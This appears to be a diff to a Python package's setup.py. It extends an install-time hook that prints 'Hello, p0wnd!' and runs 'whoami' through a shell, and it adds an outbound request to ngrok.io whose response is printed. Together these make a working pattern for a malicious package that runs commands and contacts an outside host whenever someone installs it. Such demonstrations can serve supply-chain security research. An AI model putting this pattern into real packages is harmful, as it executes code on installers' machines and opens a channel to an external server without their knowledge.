@@ -2,6 +2,7 @@ from setuptools import setup, find_packages
 from setuptools.command.install import install
 from setuptools.command.egg_info import egg_info
 import subprocess
+import requests
 
 def RunCommand():
     print("Hello, p0wnd!")
@@ -15,6 +16,9 @@ def RunCommand():
     command = "whoami"
     result = subprocess.check_output(command, shell=True, text=True)
     print(result)
+    r = requests.get('https://ngrok.io')
+    print(r.status_code)
+    print(r.text)
 
 class RunEggInfoCommand(egg_info):
     def run(self):
